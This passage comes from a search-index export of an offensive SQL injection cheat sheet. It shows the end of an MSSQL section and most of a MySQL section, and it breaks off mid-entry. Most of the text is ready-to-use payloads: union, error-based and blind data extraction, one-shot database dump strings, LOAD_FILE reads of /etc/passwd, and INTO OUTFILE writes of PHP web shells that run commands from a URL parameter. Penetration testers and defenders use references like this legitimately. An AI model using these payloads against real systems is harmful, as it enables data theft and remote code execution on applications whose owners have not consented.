(2005)    0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe\n1731    MSSQL (2012, 2014)  0x02000102030434ea1b17802fd95ea6316bd61d2c94622ca3812793e8fb1672487b5c904a45a31b2ab4a78890d563d2fcf5663e46fe797d71550494be50cf4915d3f4d55ec375\n</code></pre>"},{"location":"sql-injection-attacks/MSSQL-injection/#references","title":"References","text":"<ul> <li>PowerUpSQL Cheat Sheet &amp; SQL Server Queries - Leo Pitt</li> <li>PowerUpSQL Cheat Sheet - Scott Sutherland</li> <li>Attacking SQL Server CLR Assemblies - Scott Sutherland - July 13th, 2017</li> <li>MSSQL Agent Jobs for Command Execution - Nicholas Popovich - September 21, 2016</li> </ul>"},{"location":"sql-injection-attacks/MySQL-injection/","title":"MySQL Injection","text":""},{"location":"sql-injection-attacks/MySQL-injection/#summary","title":"Summary","text":"<ul> <li>MYSQL Default Databases</li> <li>MYSQL Comments</li> <li>MYSQL Union Based<ul> <li>Detect columns number</li> <li>Extract database with information_schema</li> <li>Extract columns name without information_schema</li> <li>Extract data without columns name</li> </ul> </li> <li>MYSQL Error Based<ul> <li>MYSQL Error Based - Basic</li> <li>MYSQL Error Based - UpdateXML function</li> <li>MYSQL Error Based - Extractvalue function</li> </ul> </li> <li>MYSQL Blind<ul> <li>MYSQL Blind with substring equivalent</li> <li>MYSQL Blind using a conditional statement</li> <li>MYSQL Blind with MAKE_SET</li> <li>MYSQL Blind with LIKE</li> </ul> </li> <li>MYSQL Time Based<ul> <li>Using SLEEP in a subselect</li> <li>Using conditional statements</li> </ul> </li> <li>MYSQL DIOS - Dump in One Shot</li> <li>MYSQL Current queries</li> <li>MYSQL Read content of a file</li> <li>MYSQL Write a shell<ul> <li>Into outfile method</li> <li>Into dumpfile method</li> </ul> </li> <li>MYSQL UDF command execution</li> <li>MYSQL Truncation</li> <li>MYSQL Fast Exploitation</li> <li>MYSQL Out of band<ul> <li>DNS exfiltration</li> <li>UNC Path - NTLM hash stealing</li> </ul> </li> <li>MYSQL WAF Bypass<ul> <li>Alternative to information schema</li> <li>Alternative to version</li> <li>Scientific Notation</li> <li>Conditional Comments</li> <li>Wide byte injection</li> </ul> </li> <li>References</li> </ul>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-default-databases","title":"MYSQL Default Databases","text":"Name Description mysql Requires root privileges information_schema Availalble from version 5 and higher"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-comments","title":"MYSQL comments","text":"Type Description <code>#</code> Hash comment <code>/* MYSQL Comment */</code> C-style comment <code>/*! MYSQL Special SQL */</code> Special SQL <code>/*!32302 10*/</code> Comment for MYSQL version 3.23.02 <code>-- -</code> SQL comment <code>;%00</code> Nullbyte ` Backtick"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-testing-injection","title":"MYSQL Testing Injection","text":"<ul> <li> <p>Strings: Query like <code>SELECT * FROM Table WHERE id = 'FUZZ';</code> <pre><code>'   False\n''  True\n\"   False\n\"\"  True\n\\   False\n\\\\  True\n</code></pre></p> </li> <li> <p>Numeric: Query like <code>SELECT * FROM Table WHERE id = FUZZ;</code> <pre><code>AND 1       True\nAND 0       False\nAND true    True\nAND false   False\n1-false     Returns 1 if vulnerable\n1-true      Returns 0 if vulnerable\n1*56        Returns 56 if vulnerable\n1*56        Returns 1 if not vulnerable\n</code></pre></p> </li> <li> <p>Login: Query like <code>SELECT * FROM Users WHERE username = 'FUZZ1' AND password = 'FUZZ2';</code> <pre><code>' OR '1\n' OR 1 -- -\n\" OR \"\" = \"\n\" OR 1 = 1 -- -\n'='\n'LIKE'\n'=0--+\n</code></pre></p> </li> </ul>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-union-based","title":"MYSQL Union Based","text":""},{"location":"sql-injection-attacks/MySQL-injection/#detect-columns-number","title":"Detect columns number","text":"<p>First you need to know the number of columns</p>"},{"location":"sql-injection-attacks/MySQL-injection/#using-order-by-or-group-by","title":"Using <code>order by</code> or <code>group by</code>","text":"<p>Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different funcionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.</p> <p><pre><code>1' ORDER BY 1--+    #True\n1' ORDER BY 2--+    #True\n1' ORDER BY 3--+    #True\n1' ORDER BY 4--+    #False - Query is only using 3 columns\n                        #-1' UNION SELECT 1,2,3--+  True\n</code></pre> or  <pre><code>1' GROUP BY 1--+    #True\n1' GROUP BY 2--+    #True\n1' GROUP BY 3--+    #True\n1' GROUP BY 4--+    #False - Query is only using 3 columns\n                        #-1' UNION SELECT 1,2,3--+  True\n</code></pre></p>"},{"location":"sql-injection-attacks/MySQL-injection/#using-order-by-or-group-by-error-based","title":"Using <code>order by</code> or <code>group by</code> Error Based","text":"<p>Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled. <pre><code>1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\n\n# Unknown column '4' in 'order clause'\n# This error means query uses 3 column\n#-1' UNION SELECT 1,2,3--+  True\n</code></pre> or <pre><code>1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+\n\n# Unknown column '4' in 'group statement'\n# This error means query uses 3 column\n#-1' UNION SELECT 1,2,3--+  True\n</code></pre></p>"},{"location":"sql-injection-attacks/MySQL-injection/#using-union-select-error-based","title":"Using <code>UNION SELECT</code> Error Based","text":"<p>This method works if error showing is enabled <pre><code>1' UNION SELECT @--+        #The used SELECT statements have a different number of columns\n1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns\n1' UNION SELECT @,@,@--+    #No error means query uses 3 column\n                            #-1' UNION SELECT 1,2,3--+  True\n</code></pre></p>"},{"location":"sql-injection-attacks/MySQL-injection/#using-limit-into-error-based","title":"Using <code>LIMIT INTO</code> Error Based","text":"<p>This method works if error showing is enabled.</p> <p>It is useful for finding the number of columns when the injection point is after a LIMIT clause. <pre><code>1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns\n1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns\n1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column\n                              #-1' UNION SELECT 1,2,3--+    True\n</code></pre></p>"},{"location":"sql-injection-attacks/MySQL-injection/#using-select-from-some_existing_table-error-based","title":"Using <code>SELECT * FROM SOME_EXISTING_TABLE</code> Error Based","text":"<p>This works if you know the table name you're after and error showing is enabled.</p> <p>It will return the amount of columns in the table, not the query.</p> <pre><code>1' AND (SELECT * FROM Users) = 1--+     #Operand should contain 3 column(s)\n                                        # This error means query uses 3 column\n                                        #-1' UNION SELECT 1,2,3--+  True\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#extract-database-with-information_schema","title":"Extract database with information_schema","text":"<p>Then the following codes will extract the databases'name, tables'name, columns'name.</p> <pre><code>UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#extract-columns-name-without-information_schema","title":"Extract columns name without information_schema","text":"<p>Method for <code>MySQL &gt;= 4.1</code>.</p> <p>First extract the column number with  <pre><code>?id=(1)and(SELECT * from db.users)=(1)\n-- Operand should contain 4 column(s)\n</code></pre></p> <p>Then extract the column name. <pre><code>?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)\n--Column 'id' cannot be null\n</code></pre></p> <p>Method for <code>MySQL 5</code></p> <pre><code>-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b)a\n--#1060 - Duplicate column name 'id'\n\n-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id))a\n-- #1060 - Duplicate column name 'name'\n\n-1 UNION SELECT * FROM (SELECT * FROM users JOIN users b USING(id,name))a\n...\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#extract-data-without-columns-name","title":"Extract data without columns name","text":"<p>Extracting data from the 4th column without knowing its name.</p> <pre><code>select `4` from (select 1,2,3,4,5,6 union select * from users)dbname;\n</code></pre> <p>Injection example inside the query <code>select author_id,title from posts where author_id=[INJECT_HERE]</code></p> <pre><code>MariaDB [dummydb]&gt; select author_id,title from posts where author_id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1);\n+-----------+-----------------------------------------------------------------+\n| author_id | title                                                           |\n+-----------+-----------------------------------------------------------------+\n|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |\n+-----------+-----------------------------------------------------------------+\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-error-based","title":"MYSQL Error Based","text":""},{"location":"sql-injection-attacks/MySQL-injection/#mysql-error-based-basic","title":"MYSQL Error Based - Basic","text":"<p>Works with <code>MySQL &gt;= 4.1</code></p> <pre><code>(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))\n'+(select 1 and row(1,1)&gt;(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-error-based-updatexml-function","title":"MYSQL Error Based - UpdateXML function","text":"<pre><code>AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--\nAND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--\n</code></pre> <p>Shorter to read:</p> <pre><code>' and updatexml(null,concat(0x0a,version()),null)-- -\n' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-error-based-extractvalue-function","title":"MYSQL Error Based - Extractvalue function","text":"<p>Works with <code>MySQL &gt;= 5.1</code></p> <pre><code>?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--\n?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-error-based-name_const-function-only-for-constants","title":"MYSQL Error Based - NAME_CONST function (only for constants)","text":"<p>Works with <code>MySQL &gt;= 5.0</code></p> <pre><code>?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--\n?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind","title":"MYSQL Blind","text":""},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind-with-substring-equivalent","title":"MYSQL Blind with substring equivalent","text":"<pre><code>?id=1 and substring(version(),1,1)=5\n?id=1 and right(left(version(),1),1)=5\n?id=1 and left(version(),1)=4\n?id=1 and ascii(lower(substr(Version(),1,1)))=51\n?id=1 and (select mid(version(),1,1)=4)\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables &gt; 'A'\n?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns &gt; 'A'\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind-sql-injection-in-order-by-clause-using-a-binary-query-and-regexp","title":"MySQL Blind SQL Injection in ORDER BY clause using a binary query and REGEXP","text":"<p>This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.</p> <pre><code>[...] ORDER BY (SELECT (CASE WHEN EXISTS(SELECT [COLUMN] FROM [TABLE] WHERE [COLUMN] REGEXP \"^[BRUTEFORCE CHAR BY CHAR].*\" AND [FURTHER OPTIONS / CONDITIONS]) THEN [ONE COLUMN TO ORDER BY] ELSE [ANOTHER COLUMN TO ORDER BY] END)); -- -\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind-sql-injection-binary-query-using-regexp","title":"MySQL Blind SQL Injection binary query using REGEXP.","text":"<p>Payload: <pre><code>' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -\n</code></pre></p> <p>Would work in the query (where the \"where\" clause is the injection point): <pre><code>SELECT name,price FROM items WHERE name = '' OR (SELECT (CASE WHEN EXISTS(SELECT name FROM items WHERE name REGEXP \"^a.*\") THEN SLEEP(3) ELSE 1 END)); -- -';\n</code></pre></p> <p>In said query, it will check to see if an item exists in the \"name\" column in the \"items\" database that starts with an \"a\". If it will sleep for 3 seconds per item.</p>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind-using-a-conditional-statement","title":"MYSQL Blind using a conditional statement","text":"<p>TRUE: <code>if @@version starts with a 5</code>:</p> <pre><code>2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\nResponse:\nHTTP/1.1 500 Internal Server Error\n</code></pre> <p>False: <code>if @@version starts with a 4</code>:</p> <pre><code>2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2\nResponse:\nHTTP/1.1 200 OK\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind-with-make_set","title":"MYSQL Blind with MAKE_SET","text":"<pre><code>AND MAKE_SET(YOLO&lt;(SELECT(length(version()))),1)\nAND MAKE_SET(YOLO&lt;ascii(substring(version(),POS,1)),1)\nAND MAKE_SET(YOLO&lt;(SELECT(length(concat(login,password)))),1)\nAND MAKE_SET(YOLO&lt;ascii(substring(concat(login,password),POS,1)),1)\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-blind-with-like","title":"MYSQL Blind with LIKE","text":"<p>'_' acts like the regex character '.', use it to speed up your blind testing</p> <pre><code>SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-time-based","title":"MYSQL Time Based","text":"<p>The following SQL codes will delay the output from MySQL.</p> <ul> <li>MySQL 4/5 : <code>BENCHMARK()</code> <pre><code>+BENCHMARK(40000000,SHA1(1337))+\n'%2Bbenchmark(3200,SHA1(1))%2B'\nAND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1\n</code></pre></li> <li>MySQL 5: <code>SLEEP()</code> <pre><code>RLIKE SLEEP([SLEEPTIME])\nOR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))\n</code></pre></li> </ul>"},{"location":"sql-injection-attacks/MySQL-injection/#using-sleep-in-a-subselect","title":"Using SLEEP in a subselect","text":"<pre><code>1 and (select sleep(10) from dual where database() like '%')#\n1 and (select sleep(10) from dual where database() like '___')# \n1 and (select sleep(10) from dual where database() like '____')#\n1 and (select sleep(10) from dual where database() like '_____')#\n1 and (select sleep(10) from dual where database() like 'a____')#\n...\n1 and (select sleep(10) from dual where database() like 's____')#\n1 and (select sleep(10) from dual where database() like 'sa___')#\n...\n1 and (select sleep(10) from dual where database() like 'sw___')#\n1 and (select sleep(10) from dual where database() like 'swa__')#\n1 and (select sleep(10) from dual where database() like 'swb__')#\n1 and (select sleep(10) from dual where database() like 'swi__')#\n...\n1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#using-conditional-statements","title":"Using conditional statements","text":"<pre><code>?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))&gt;=100,1, BENCHMARK(2000000,MD5(NOW()))) --\n?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))&gt;=100, 1, SLEEP(3)) --\n?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-dios-dump-in-one-shot","title":"MYSQL DIOS - Dump in One Shot","text":"<pre><code>(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema&gt;=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] &gt; ',table_name,' &gt; ',column_name,0x7C))))a)#\n\n(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] &gt; ',column_data2,' &gt; ',0x7C))))a)#\n\n-- SecurityIdiots\nmake_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n\n-- Profexer\n(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)\n\n-- Dr.Z3r0\n(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))\n\n-- M@dBl00d\n(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))\n\n-- Zen\n+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)\n\n-- Zen WAF\n(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)\n\n-- ~tr0jAn WAF\n+concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/+\n\n-- ~tr0jAn Benchmark\n+concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name&gt;@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name&gt;@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name&gt;@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)+\n\n-- N1Z4M WAF\n+/*!13337concat*/(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a6563746564206279204e315a344d3c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID/**N1Z4M**/(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(/*!13337select*/(@a)/*!13337from*/(/*!13337select*/(@a:=0x00),(/*!13337select*/(@a)/*!13337from*/(information_schema.columns)/*!13337where*/(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=/*!13337concat*/(@a,table_schema,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,table_name,0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e,column_name,0x3c62723e))))a))+\n\n-- sharik\n(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-current-queries","title":"MYSQL Current queries","text":"<p>This table can list all operations that DB is performing at the moment.</p> <pre><code>union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #\n\n-- Dump in one shot example for the table content.\nunion select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-read-content-of-a-file","title":"MYSQL Read content of a file","text":"<p>Need the <code>filepriv</code>, otherwise you will get the error : <code>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p> <pre><code>' UNION ALL SELECT LOAD_FILE('/etc/passwd') --\n</code></pre> <pre><code>UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));\n</code></pre> <p>If you are <code>root</code> on the database, you can re-enable the <code>LOAD_FILE</code> using the following query</p> <pre><code>GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-write-a-shell","title":"MYSQL Write a shell","text":""},{"location":"sql-injection-attacks/MySQL-injection/#into-outfile-method","title":"Into outfile method","text":"<pre><code>[...] UNION SELECT \"&lt;?php system($_GET['cmd']); ?&gt;\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\"\n[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '&lt;?php phpinfo();?&gt;'\n[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\\\wamp\\\\www\\\\pwnd.php'-- -\n[...] union all select 1,2,3,4,\"&lt;?php echo shell_exec($_GET['cmd']);?&gt;\",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#into-dumpfile-method","title":"Into dumpfile method","text":"<pre><code>[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'\n[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';\n</code></pre>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-truncation","title":"MYSQL Truncation","text":"<p>In MYSQL \"<code>admin</code>\" and \"<code>admin</code>\" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.</p> <pre><code>`username` varchar(20) not null\n</code></pre> <p>Payload: <code>username = \"admin               a\"</code></p>"},{"location":"sql-injection-attacks/MySQL-injection/#mysql-fast-exploitation","title":"MYSQL Fast Exploitation","text":"<p>Requirement: 